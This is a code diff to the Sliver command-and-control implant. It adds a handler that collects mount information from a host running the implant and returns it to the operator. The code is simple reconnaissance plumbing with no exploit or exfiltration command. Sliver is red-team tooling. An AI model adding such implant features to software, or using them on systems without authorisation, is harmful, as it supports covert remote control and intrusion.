@@ -32,6 +32,7 @@ import (
 	"unsafe"
 
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
+	"github.com/bishopfox/sliver/implant/sliver/mount"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -71,6 +72,7 @@ var (
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgProcessDumpReq: dumpHandler,
+		sliverpb.MsgMountReq:       mountHandler,
 		sliverpb.MsgGrepReq:        grepHandler,
 
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
@@ -121,6 +123,27 @@ func dumpHandler(data []byte, resp RPCResponse) {
 		}
 	}
 	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
+}
+
+func mountHandler(data []byte, resp RPCResponse) {
+	mountReq := &sliverpb.MountReq{}
+	err := proto.Unmarshal(data, mountReq)
+	if err != nil {
+		return
+	}
+
+	mountData, err := mount.GetMountInformation()
+	mountResp := &sliverpb.Mount{
+		Info:     mountData,
+		Response: &commonpb.Response{},
+	}
+
+	if err != nil {
+		mountResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(mountResp)
 	resp(data, err)
 }
 
